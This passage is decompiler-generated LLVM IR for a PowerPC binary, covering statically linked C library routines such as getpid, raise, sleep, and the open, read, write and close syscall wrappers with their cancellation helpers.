  uselistorder label %dec_label_pc_1000c7d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c81c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000c780, { 1, 0 }
}

define i32 @__getpid(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %r9.global-to-local = alloca i32, align 4
  %v0_1000ca9c = load i32, i32* @r2, align 4
  %v1_1000ca9c = add i32 %v0_1000ca9c, -29808
  store i32 %v1_1000ca9c, i32* %r9.global-to-local, align 4
  %v1_1000caa0 = add i32 %v0_1000ca9c, -29700
  %v2_1000caa0 = inttoptr i32 %v1_1000caa0 to i32*
  %v3_1000caa0 = load i32, i32* %v2_1000caa0, align 4
  %v2_1000caa4 = icmp sgt i32 %v3_1000caa0, 0
  %v3_1000caa4 = icmp eq i32 %v3_1000caa0, 0
  store i1 %v3_1000caa4, i1* %cr6_eq.global-to-local, align 1
  %v0_1000caa8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000caa4, i32 %v0_1000caa8)
  br i1 %v3_1000caa4, label %dec_label_pc_1000cab0, label %dec_label_pc_1000cabc

dec_label_pc_1000cab0:                            ; preds = %entry
  %v0_1000cab0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cab0 = add i32 %v0_1000cab0, 104
  %v2_1000cab0 = inttoptr i32 %v1_1000cab0 to i32*
  %v3_1000cab0 = load i32, i32* %v2_1000cab0, align 4
  %v0_1000cab8 = load i32, i32* @lr, align 4
  %v2_1000cab8 = icmp ne i32 %v3_1000cab0, 0
  call void @__pseudo_cond_branch(i1 %v2_1000cab8, i32 %v0_1000cab8)
  br label %dec_label_pc_1000cabc

dec_label_pc_1000cabc:                            ; preds = %entry, %dec_label_pc_1000cab0
  %v0_1000cac4 = call i32 @__asm_mfcr()
  %v0_1000cac8 = load i32, i32* @lr, align 4
  %v1_1000cac8 = load i1, i1* %cr6_eq.global-to-local, align 1
  %v2_1000cac8 = xor i1 %v1_1000cac8, true
  call void @__pseudo_cond_branch(i1 %v2_1000cac8, i32 %v0_1000cac8)
  %v1_1000cacc = load i32, i32* @r2, align 4
  %v2_1000cacc = add i32 %v1_1000cacc, -29704
  %v3_1000cacc = inttoptr i32 %v2_1000cacc to i32*
  store i32 %v0_1000cac4, i32* %v3_1000cacc, align 4
  ret i32 %v0_1000cac4

; uselistorder directives
  uselistorder i32 %v3_1000caa0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cabc, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_1000cad8 = load i32, i32* @r2, align 4
  %v1_1000cadc = add i32 %v0_1000cad8, -29704
  %v2_1000cadc = inttoptr i32 %v1_1000cadc to i32*
  %v3_1000cadc = load i32, i32* %v2_1000cadc, align 4
  %v3_1000cae8 = icmp eq i32 %v3_1000cadc, 0
  %v1_1000caec = add i32 %v0_1000cad8, -29700
  %v2_1000caec = inttoptr i32 %v1_1000caec to i32*
  %v3_1000caec = load i32, i32* %v2_1000caec, align 4
  store i32 %v3_1000caec, i32* %r3.global-to-local, align 4
  br i1 %v3_1000cae8, label %dec_label_pc_1000caf4, label %dec_label_pc_1000cb0c

dec_label_pc_1000caf4:                            ; preds = %entry
  %v0_1000cafc = call i32 @__asm_mfcr()
  store i32 %v0_1000cafc, i32* %r3.global-to-local, align 4
  %v1_1000cb04 = load i32, i32* @r2, align 4
  %v2_1000cb04 = add i32 %v1_1000cb04, -29704
  %v3_1000cb04 = inttoptr i32 %v2_1000cb04 to i32*
  store i32 %v0_1000cafc, i32* %v3_1000cb04, align 4
  br label %dec_label_pc_1000cb28

dec_label_pc_1000cb0c:                            ; preds = %entry
  %v2_1000cb0c = icmp sgt i32 %v3_1000caec, 0
  br i1 %v2_1000cb0c, label %dec_label_pc_1000cb28, label %dec_label_pc_1000cb14

dec_label_pc_1000cb14:                            ; preds = %dec_label_pc_1000cb0c
  %v1_1000cb14 = urem i32 %v3_1000caec, -2147483648
  %v3_1000cb14 = icmp eq i32 %v1_1000cb14, 0
  br i1 %v3_1000cb14, label %dec_label_pc_1000cb1c, label %dec_label_pc_1000cb24

dec_label_pc_1000cb1c:                            ; preds = %dec_label_pc_1000cb14
  store i32 %v3_1000cadc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cb28

dec_label_pc_1000cb24:                            ; preds = %dec_label_pc_1000cb14
  %v1_1000cb24 = sub i32 0, %v3_1000caec
  store i32 %v1_1000cb24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cb28

dec_label_pc_1000cb28:                            ; preds = %dec_label_pc_1000cb0c, %dec_label_pc_1000cb1c, %dec_label_pc_1000caf4, %dec_label_pc_1000cb24
  %v0_1000cb34 = call i32 @__asm_mfcr()
  store i32 %v0_1000cb34, i32* %r3.global-to-local, align 4
  %v1_1000cb38 = and i32 %v0_1000cb34, 268435456
  %v3_1000cb38 = icmp eq i32 %v1_1000cb38, 0
  br i1 %v3_1000cb38, label %dec_label_pc_1000cb5c, label %dec_label_pc_1000cb44

dec_label_pc_1000cb44:                            ; preds = %dec_label_pc_1000cb28
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000cb50 = load i32, i32* @r2, align 4
  %v1_1000cb54 = add i32 %v0_1000cb50, -28672
  %v2_1000cb58 = inttoptr i32 %v1_1000cb54 to i32*
  store i32 %v0_1000cb34, i32* %v2_1000cb58, align 4
  %v0_1000cb64.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cb5c

dec_label_pc_1000cb5c:                            ; preds = %dec_label_pc_1000cb28, %dec_label_pc_1000cb44
  %v0_1000cb64 = phi i32 [ %v0_1000cb34, %dec_label_pc_1000cb28 ], [ %v0_1000cb64.pre, %dec_label_pc_1000cb44 ]
  ret i32 %v0_1000cb64

; uselistorder directives
  uselistorder i32 %v3_1000caec, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 5, 6, 1, 7, 2 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 -29700, { 0, 3, 4, 1, 2 }
  uselistorder i32 -29704, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb28, { 3, 1, 0, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1000cb6c = icmp eq i32 %arg1, 0
  %v0_1000cb7c = load i32, i32* @r31, align 4
  store i32 %arg1, i32* %stack_var_-56, align 4
  br i1 %v3_1000cb6c, label %dec_label_pc_1000cb8c, label %dec_label_pc_1000cbe8

dec_label_pc_1000cb8c:                            ; preds = %entry
  %v0_1000cb8c = load i32, i32* @r2, align 4
  %v1_1000cb8c = add i32 %v0_1000cb8c, -29808
  store i32 %v1_1000cb8c, i32* %r11.global-to-local, align 4
  %v1_1000cb94 = add i32 %v0_1000cb8c, -29676
  %v2_1000cb94 = inttoptr i32 %v1_1000cb94 to i32*
  %v3_1000cb94 = load i32, i32* %v2_1000cb94, align 4
  store i32 0, i32* @r31, align 4
  %v2_1000cb9c = and i32 %v3_1000cb94, -71
  %v3_1000cba0 = icmp eq i32 %v2_1000cb9c, 8
  br i1 %v3_1000cba0, label %dec_label_pc_1000cba8, label %dec_label_pc_1000cc74

dec_label_pc_1000cba8:                            ; preds = %dec_label_pc_1000cb8c
  store i32 %v1_1000cb8c, i32* %r10.global-to-local, align 4
  %v2_1000cbb0 = add i32 %v0_1000cb8c, -29264
  %v3_1000cbb0 = inttoptr i32 %v2_1000cbb0 to i32*
  store i32 -1, i32* %v3_1000cbb0, align 4
  %v0_1000cbb4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cbb4 = add i32 %v0_1000cbb4, 132
  store i32 %v1_1000cbb4, i32* %r11.global-to-local, align 4
  %v0_1000cbb8.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cbc4.pre = load i32, i32* @r8, align 4
  %v1_1000cbb8 = add i32 %v0_1000cbb8.pre, 132
  %v2_1000cbb8 = inttoptr i32 %v1_1000cbb8 to i32*
  br label %dec_label_pc_1000cbb8

dec_label_pc_1000cbb8:                            ; preds = %dec_label_pc_1000cbb8, %dec_label_pc_1000cba8
  %v1_1000cbc4 = phi i32 [ %v2_1000cbc4, %dec_label_pc_1000cbb8 ], [ %v1_1000cbc4.pre, %dec_label_pc_1000cba8 ]
  %v3_1000cbb8 = load i32, i32* %v2_1000cbb8, align 4
  %v2_1000cbc4 = sub i32 %v1_1000cbc4, %v3_1000cbb8
  store i32 %v2_1000cbc4, i32* @r8, align 4
  %v3_1000cbd8 = icmp eq i32 %v2_1000cbc4, 0
  br i1 %v3_1000cbd8, label %dec_label_pc_1000cbe0, label %dec_label_pc_1000cbb8

dec_label_pc_1000cbe0:                            ; preds = %dec_label_pc_1000cbb8
  %v0_1000cbe4 = call i32 @unknown_10000000()
  br label %dec_label_pc_1000cbe8

dec_label_pc_1000cbe8:                            ; preds = %entry, %dec_label_pc_1000cbe0
  %v2_1000cbf8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 65536, i32* %stack_var_-48, align 4
  store i32 268487684, i32* @lr, align 4
  %v3_1000cc00 = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_1000cbf8)
  %v3_1000cc04 = load i32, i32* %stack_var_-40, align 4
  %v3_1000cc08 = icmp eq i32 %v3_1000cc04, 1
  br i1 %v3_1000cc08, label %dec_label_pc_1000cc10, label %dec_label_pc_1000cc20

dec_label_pc_1000cc10:                            ; preds = %dec_label_pc_1000cbe8
  %v2_1000cc10 = ptrtoint i32* %stack_var_-48 to i32
  %v4_1000cc1c = call i32 @__GI_sigprocmask(i32 0, i32* nonnull %stack_var_-48, i32 %v2_1000cc10)
  br label %dec_label_pc_1000cc20

dec_label_pc_1000cc20:                            ; preds = %dec_label_pc_1000cbe8, %dec_label_pc_1000cc10
  %v2_1000cc20 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268487728, i32* @lr, align 4
  %v2_1000cc2c = call i32 @__libc_nanosleep(i32 %v2_1000cc20, i32 %v2_1000cc20)
  %v3_1000cc30 = icmp eq i32 %v2_1000cc2c, 0
  br i1 %v3_1000cc30, label %dec_label_pc_1000cc58, label %dec_label_pc_1000cc38

dec_label_pc_1000cc38:                            ; preds = %dec_label_pc_1000cc20
  %v3_1000cc48 = load i32, i32* %stack_var_-56, align 4
  %v0_1000cc4c = call i32 @__asm_mfcr()
  %v1_1000cc50 = call i32 @__asm_rlwinm(i32 %v0_1000cc4c, i32 30, i32 31, i32 31)
  %v2_1000cc54 = add i32 %v3_1000cc48, %v1_1000cc50
  store i32 %v2_1000cc54, i32* @r31, align 4
  br label %dec_label_pc_1000cc58

dec_label_pc_1000cc58:                            ; preds = %dec_label_pc_1000cc20, %dec_label_pc_1000cc38
  %v3_1000cc58 = load i32, i32* %stack_var_-48, align 4
  %v1_1000cc5c = and i32 %v3_1000cc58, 65536
  store i32 %v1_1000cc5c, i32* @r8, align 4
  %v3_1000cc5c = icmp eq i32 %v1_1000cc5c, 0
  br i1 %v3_1000cc5c, label %dec_label_pc_1000cc64, label %dec_label_pc_1000cc74

dec_label_pc_1000cc64:                            ; preds = %dec_label_pc_1000cc58
  %v4_1000cc70 = call i32 @__GI_sigprocmask(i32 2, i32* nonnull %stack_var_-48, i32 0)
  br label %dec_label_pc_1000cc74

dec_label_pc_1000cc74:                            ; preds = %dec_label_pc_1000cc58, %dec_label_pc_1000cb8c, %dec_label_pc_1000cc64
  %v0_1000cc78 = load i32, i32* @r31, align 4
  store i32 %v0_1000cb7c, i32* @r31, align 4
  ret i32 %v0_1000cc78

; uselistorder directives
  uselistorder i32 %v2_1000cbc4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 0, 4, 3 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cc74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cc58, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc20, { 1, 0 }
  uselistorder label %dec_label_pc_1000cbe8, { 1, 0 }
}

define i32 @__lll_lock_wait_private() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000cc90 = load i32, i32* @r3, align 4
  %v1_1000cc90 = inttoptr i32 %v0_1000cc90 to i32*
  %v2_1000cc90 = load i32, i32* %v1_1000cc90, align 4
  store i32 %v0_1000cc90, i32* %r31.global-to-local, align 4
  %v3_1000cc9c = icmp eq i32 %v2_1000cc90, 2
  br i1 %v3_1000cc9c, label %dec_label_pc_1000cca4, label %dec_label_pc_1000ccd0

dec_label_pc_1000cca4:                            ; preds = %entry
  %v0_1000ccb8 = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000ccd0

dec_label_pc_1000ccc0:                            ; preds = %dec_label_pc_1000cce0
  %v0_1000cccc = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000ccd0

dec_label_pc_1000ccd0:                            ; preds = %entry, %dec_label_pc_1000cca4, %dec_label_pc_1000ccc0
  %v0_1000ccdc.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000ccd4

dec_label_pc_1000ccd4:                            ; preds = %dec_label_pc_1000ccd4, %dec_label_pc_1000ccd0
  %v0_1000ccdc = phi i1 [ false, %dec_label_pc_1000ccd4 ], [ %v0_1000ccdc.pr, %dec_label_pc_1000ccd0 ]
  br i1 %v0_1000ccdc, label %dec_label_pc_1000cce0, label %dec_label_pc_1000ccd4

dec_label_pc_1000cce0:                            ; preds = %dec_label_pc_1000ccd4
  %v0_1000cce4 = load i32, i32* @r9, align 4
  %v3_1000cce4 = icmp eq i32 %v0_1000cce4, 0
  store i32 221, i32* @r0, align 4
  %v0_1000ccec = load i32, i32* %r31.global-to-local, align 4
  store i32 128, i32* @r4, align 4
  br i1 %v3_1000cce4, label %dec_label_pc_1000ccf8, label %dec_label_pc_1000ccc0

dec_label_pc_1000ccf8:                            ; preds = %dec_label_pc_1000cce0
  ret i32 %v0_1000ccec

; uselistorder directives
  uselistorder label %dec_label_pc_1000ccd0, { 2, 1, 0 }
}

define i32 @__GI___libc_close() local_unnamed_addr {
entry:
  %v0_1000cd04 = load i32, i32* @r2, align 4
  %v1_1000cd04 = add i32 %v0_1000cd04, -29808
  %v2_1000cd04 = inttoptr i32 %v1_1000cd04 to i32*
  %v3_1000cd04 = load i32, i32* %v2_1000cd04, align 4
  %v3_1000cd08 = icmp eq i32 %v3_1000cd04, 0
  store i1 %v3_1000cd08, i1* @cr0_eq, align 1
  %v1_1000cd0c = xor i1 %v3_1000cd08, true
  call void @__pseudo_cond_branch(i1 %v1_1000cd0c, i32 268487968)
  %v2_1000cd0c = load i32, i32* @r3, align 4
  ret i32 %v2_1000cd0c
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_1000cd18 = load i32, i32* @lr, align 4
  %v1_1000cd18 = load i1, i1* @cr0_so, align 1
  %v2_1000cd18 = xor i1 %v1_1000cd18, true
  call void @__pseudo_cond_branch(i1 %v2_1000cd18, i32 %v0_1000cd18)
  %v0_1000cd1c = call i32 @__syscall_error()
  %v0_1000cd24 = load i32, i32* @lr, align 4
  store i32 268487988, i32* @lr, align 4
  %v0_1000cd30 = call i32 @__libc_enable_asynccancel()
  %v0_1000cd44 = call i32 @__asm_mfcr()
  %v1_1000cd54 = call i32 @__libc_disable_asynccancel(i32 %v0_1000cd30)
  store i32 %v0_1000cd44, i32* @r3, align 4
  %v1_1000cd68 = call %0 @__asm_mtcrf(i32 255, i32 %v0_1000cd44)
  %v5_1000cd68 = extractvalue %0 %v1_1000cd68, 3
  %v2_1000cd70 = xor i1 %v5_1000cd68, true
  call void @__pseudo_cond_branch(i1 %v2_1000cd70, i32 %v0_1000cd24)
  %v0_1000cd74 = call i32 @__syscall_error()
  ret i32 %v0_1000cd74
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000cd78 = load i32, i32* @r2, align 4
  %v1_1000cd78 = add i32 %v0_1000cd78, -29808
  %v2_1000cd78 = inttoptr i32 %v1_1000cd78 to i32*
  %v3_1000cd78 = load i32, i32* %v2_1000cd78, align 4
  %v3_1000cd7c = icmp eq i32 %v3_1000cd78, 0
  store i1 %v3_1000cd7c, i1* @cr0_eq, align 1
  %v1_1000cd80 = xor i1 %v3_1000cd7c, true
  call void @__pseudo_cond_branch(i1 %v1_1000cd80, i32 268488084)
  %v2_1000cd80 = load i32, i32* @r3, align 4
  ret i32 %v2_1000cd80
}

define i32 @__GI___open_nocancel(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000cd8c = load i32, i32* @lr, align 4
  %v1_1000cd8c = load i1, i1* @cr0_so, align 1
  %v2_1000cd8c = xor i1 %v1_1000cd8c, true
  call void @__pseudo_cond_branch(i1 %v2_1000cd8c, i32 %v0_1000cd8c)
  %v0_1000cd90 = call i32 @__syscall_error()
  %v0_1000cd98 = load i32, i32* @lr, align 4
  store i32 268488112, i32* @lr, align 4
  %v0_1000cdac = call i32 @__libc_enable_asynccancel()
  %v0_1000cdc8 = call i32 @__asm_mfcr()
  %v1_1000cdd8 = call i32 @__libc_disable_asynccancel(i32 %v0_1000cdac)
  store i32 %v0_1000cdc8, i32* @r3, align 4
  %v1_1000cdec = call %0 @__asm_mtcrf(i32 255, i32 %v0_1000cdc8)
  %v5_1000cdec = extractvalue %0 %v1_1000cdec, 3
  %v2_1000cdf4 = xor i1 %v5_1000cdec, true
  call void @__pseudo_cond_branch(i1 %v2_1000cdf4, i32 %v0_1000cd98)
  %v0_1000cdf8 = call i32 @__syscall_error()
  ret i32 %v0_1000cdf8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000cdfc = load i32, i32* @r2, align 4
  %v1_1000cdfc = add i32 %v0_1000cdfc, -29808
  %v2_1000cdfc = inttoptr i32 %v1_1000cdfc to i32*
  %v3_1000cdfc = load i32, i32* %v2_1000cdfc, align 4
  %v1_1000ce04 = icmp ne i32 %v3_1000cdfc, 0
  call void @__pseudo_cond_branch(i1 %v1_1000ce04, i32 268488216)
  %v2_1000ce04 = load i32, i32* @r3, align 4
  ret i32 %v2_1000ce04
}

define i32 @__GI___write_nocancel(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000ce10 = load i32, i32* @lr, align 4
  %v1_1000ce10 = load i1, i1* @cr0_so, align 1
  %v2_1000ce10 = xor i1 %v1_1000ce10, true
  call void @__pseudo_cond_branch(i1 %v2_1000ce10, i32 %v0_1000ce10)
  %v0_1000ce14 = call i32 @__syscall_error()
  %v0_1000ce1c = load i32, i32* @lr, align 4
  store i32 268488244, i32* @lr, align 4
  %v0_1000ce30 = call i32 @__libc_enable_asynccancel()
  %v0_1000ce4c = call i32 @__asm_mfcr()
  %v1_1000ce5c = call i32 @__libc_disable_asynccancel(i32 %v0_1000ce30)
  store i32 %v0_1000ce4c, i32* @r3, align 4
  %v1_1000ce70 = call %0 @__asm_mtcrf(i32 255, i32 %v0_1000ce4c)
  %v5_1000ce70 = extractvalue %0 %v1_1000ce70, 3
  %v2_1000ce78 = xor i1 %v5_1000ce70, true
  call void @__pseudo_cond_branch(i1 %v2_1000ce78, i32 %v0_1000ce1c)
  %v0_1000ce7c = call i32 @__syscall_error()
  ret i32 %v0_1000ce7c
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000ce80 = load i32, i32* @r2, align 4
  %v1_1000ce80 = add i32 %v0_1000ce80, -29808
  %v2_1000ce80 = inttoptr i32 %v1_1000ce80 to i32*
  %v3_1000ce80 = load i32, i32* %v2_1000ce80, align 4
  %v1_1000ce88 = icmp ne i32 %v3_1000ce80, 0
  call void @__pseudo_cond_branch(i1 %v1_1000ce88, i32 268488348)
  %v2_1000ce88 = load i32, i32* @r3, align 4
  ret i32 %v2_1000ce88
}

define i32 @__read_nocancel(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000ce94 = load i32, i32* @lr, align 4
  %v1_1000ce94 = load i1, i1* @cr0_so, align 1
  %v2_1000ce94 = xor i1 %v1_1000ce94, true
  call void @__pseudo_cond_branch(i1 %v2_1000ce94, i32 %v0_1000ce94)
  %v0_1000ce98 = call i32 @__syscall_error()
  %v0_1000cea0 = load i32, i32* @lr, align 4
  store i32 268488376, i32* @lr, align 4
  %v0_1000ceb4 = call i32 @__libc_enable_asynccancel()
  %v0_1000ced0 = call i32 @__asm_mfcr()
  %v1_1000cee0 = call i32 @__libc_disable_asynccancel(i32 %v0_1000ceb4)
  store i32 %v0_1000ced0, i32* @r3, align 4
  %v1_1000cef4 = call %0 @__asm_mtcrf(i32 255, i32 %v0_1000ced0)
  %v5_1000cef4 = extractvalue %0 %v1_1000cef4, 3
  %v2_1000cefc = xor i1 %v5_1000cef4, true
  call void @__pseudo_cond_branch(i1 %v2_1000cefc, i32 %v0_1000cea0)
  %v0_1000cf00 = call i32 @__syscall_error()
  ret i32 %v0_1000cf00

; uselistorder directives
  uselistorder i1* @cr0_so, { 1, 0, 3, 2 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000cf04 = and i32 %arg1, 2
  store i32 %v1_1000cf04, i32* %r0.global-to-local, align 4
  %v3_1000cf04 = icmp eq i32 %v1_1000cf04, 0
  store i1 %v3_1000cf04, i1* @cr0_eq, align 1
  br i1 %v3_1000cf04, label %dec_label_pc_1000cf14, label %dec_label_pc_1000cf74

dec_label_pc_1000cf14:                            ; preds = %entry
  %v0_1000cf14 = load i32, i32* @r2, align 4
  %v1_1000cf14 = add i32 %v0_1000cf14, -29808
  store i32 %v1_1000cf14, i32* %r31.global-to-local, align 4
  %v1_1000cf18 = add i32 %v0_1000cf14, -29676
  %v2_1000cf18 = inttoptr i32 %v1_1000cf18 to i32*
  %v3_1000cf18 = load i32, i32* %v2_1000cf18, align 4
  store i32 %v3_1000cf18, i32* %r0.global-to-local, align 4
  store i32 %v1_1000cf18, i32* @r11, align 4
  br label %dec_label_pc_1000cf24

dec_label_pc_1000cf24:                            ; preds = %dec_label_pc_1000cf14, %dec_label_pc_1000cf44
  %v0_1000cf20 = phi i32 [ %v0_1000cf28, %dec_label_pc_1000cf44 ], [ %v3_1000cf18, %dec_label_pc_1000cf14 ]
  %v1_1000cf20 = call i32 @__asm_rlwinm(i32 %v0_1000cf20, i32 0, i32 31, i32 29)
  store i32 %v1_1000cf20, i32* @r5, align 4
  %v0_1000cf28 = load i32, i32* @r9, align 4
  %v1_1000cf28 = load i32, i32* %r0.global-to-local, align 4
  %v4_1000cf28 = icmp eq i32 %v0_1000cf28, %v1_1000cf28
  store i1 %v4_1000cf28, i1* @cr0_eq, align 1
  br i1 %v4_1000cf28, label %dec_label_pc_1000cf68.preheader, label %dec_label_pc_1000cf44

dec_label_pc_1000cf68.preheader:                  ; preds = %dec_label_pc_1000cf24
  %v1_1000cf682 = call i32 @__asm_rlwinm(i32 %v1_1000cf20, i32 0, i32 28, i32 29)
  store i32 %v1_1000cf682, i32* %r0.global-to-local, align 4
  %v3_1000cf6c5 = icmp eq i32 %v1_1000cf682, 4
  br i1 %v3_1000cf6c5, label %dec_label_pc_1000cf4c, label %dec_label_pc_1000cf74.loopexit

dec_label_pc_1000cf44:                            ; preds = %dec_label_pc_1000cf24
  store i32 %v0_1000cf28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000cf24

dec_label_pc_1000cf4c:                            ; preds = %dec_label_pc_1000cf68.preheader, %dec_label_pc_1000cf4c
  store i32 221, i32* %r0.global-to-local, align 4
  %v0_1000cf50 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cf50 = add i32 %v0_1000cf50, 132
  store i32 %v1_1000cf50, i32* %r3.global-to-local, align 4
  store i32 128, i32* @r4, align 4
  %v0_1000cf60 = call i32 @__asm_mfcr()
  store i32 %v0_1000cf60, i32* %r3.global-to-local, align 4
  store i32 %v0_1000cf60, i32* %r0.global-to-local, align 4
  %v0_1000cf64 = load i32, i32* @r2, align 4
  %v1_1000cf64 = add i32 %v0_1000cf64, -29676
  %v2_1000cf64 = inttoptr i32 %v1_1000cf64 to i32*
  %v3_1000cf64 = load i32, i32* %v2_1000cf64, align 4
  store i32 %v3_1000cf64, i32* @r5, align 4
  %v1_1000cf68 = call i32 @__asm_rlwinm(i32 %v3_1000cf64, i32 0, i32 28, i32 29)
  store i32 %v1_1000cf68, i32* %r0.global-to-local, align 4
  %v3_1000cf6c = icmp eq i32 %v1_1000cf68, 4
  br i1 %v3_1000cf6c, label %dec_label_pc_1000cf4c, label %dec_label_pc_1000cf74.loopexit

dec_label_pc_1000cf74.loopexit:                   ; preds = %dec_label_pc_1000cf4c, %dec_label_pc_1000cf68.preheader
  %v0_1000cf7c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cf74

dec_label_pc_1000cf74:                            ; preds = %dec_label_pc_1000cf74.loopexit, %entry
  %v0_1000cf7c = phi i32 [ %v0_1000cf7c.pre, %dec_label_pc_1000cf74.loopexit ], [ %arg1, %entry ]
  ret i32 %v0_1000cf7c

; uselistorder directives
  uselistorder i32 %v0_1000cf60, { 1, 0 }
  uselistorder i32 %v0_1000cf28, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 0, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cf4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf24, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %v0_1000cf80 = load i32, i32* @lr, align 4
  %v0_1000cf88 = load i32, i32* @r2, align 4
  %v1_1000cf88 = add i32 %v0_1000cf88, -29808
  %v1_1000cf90 = add i32 %v0_1000cf88, -29676
  %v2_1000cf90 = inttoptr i32 %v1_1000cf90 to i32*
  %v3_1000cf90 = load i32, i32* %v2_1000cf90, align 4
  store i32 %v1_1000cf90, i32* @r9, align 4
  %v1_1000cf982 = or i32 %v3_1000cf90, 2
  store i32 %v1_1000cf982, i32* @r11, align 4
  %v4_1000cf9c4 = icmp eq i32 %v1_1000cf982, %v3_1000cf90
  br i1 %v4_1000cf9c4, label %dec_label_pc_1000d01c, label %dec_label_pc_1000cfa4.preheader

dec_label_pc_1000cfa4.preheader:                  ; preds = %entry
  %v1_1000cf98 = or i32 %v0_1000cf80, 2
  %v4_1000cf9c = icmp eq i32 %v1_1000cf98, %v0_1000cf80
  br label %dec_label_pc_1000cfa4

dec_label_pc_1000cfa4:                            ; preds = %dec_label_pc_1000cfa4.preheader, %dec_label_pc_1000cfc4
  %v0_1000cfd0 = phi i32 [ %v1_1000cf98, %dec_label_pc_1000cfc4 ], [ %v1_1000cf982, %dec_label_pc_1000cfa4.preheader ]
  %v1_1000cfbc = phi i32 [ %v0_1000cf80, %dec_label_pc_1000cfc4 ], [ %v3_1000cf90, %dec_label_pc_1000cfa4.preheader ]
  %v4_1000cfa8 = icmp eq i32 %v0_1000cf80, %v1_1000cfbc
  br i1 %v4_1000cfa8, label %dec_label_pc_1000cfcc, label %dec_label_pc_1000cfc4

dec_label_pc_1000cfc4:                            ; preds = %dec_label_pc_1000cfa4
  store i32 %v1_1000cf98, i32* @r11, align 4
  br i1 %v4_1000cf9c, label %dec_label_pc_1000cf98.dec_label_pc_1000d01c.loopexit_crit_edge, label %dec_label_pc_1000cfa4

dec_label_pc_1000cfcc:                            ; preds = %dec_label_pc_1000cfa4
  %v2_1000cfd0 = and i32 %v0_1000cfd0, -69
  %v3_1000cfd4 = icmp eq i32 %v2_1000cfd0, 10
  br i1 %v3_1000cfd4, label %dec_label_pc_1000cfdc, label %dec_label_pc_1000d01c

dec_label_pc_1000cfdc:                            ; preds = %dec_label_pc_1000cfcc
  store i32 %v1_1000cf88, i32* %r10.global-to-local, align 4
  %v2_1000cfe4 = add i32 %v0_1000cf88, -29264
  %v3_1000cfe4 = inttoptr i32 %v2_1000cfe4 to i32*
  store i32 -1, i32* %v3_1000cfe4, align 4
  %v0_1000cfe8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000cfe8 = add i32 %v0_1000cfe8, 132
  store i32 %v1_1000cfe8, i32* @r11, align 4
  %v1_1000cff8.pre = load i32, i32* @r8, align 4
  %v2_1000cfec = inttoptr i32 %v1_1000cfe8 to i32*
  br label %dec_label_pc_1000cfec

dec_label_pc_1000cfec:                            ; preds = %dec_label_pc_1000cfec, %dec_label_pc_1000cfdc
  %v1_1000cff8 = phi i32 [ %v2_1000cff8, %dec_label_pc_1000cfec ], [ %v1_1000cff8.pre, %dec_label_pc_1000cfdc ]
  %v3_1000cfec = load i32, i32* %v2_1000cfec, align 4
  %v1_1000cff0 = or i32 %v3_1000cfec, 16
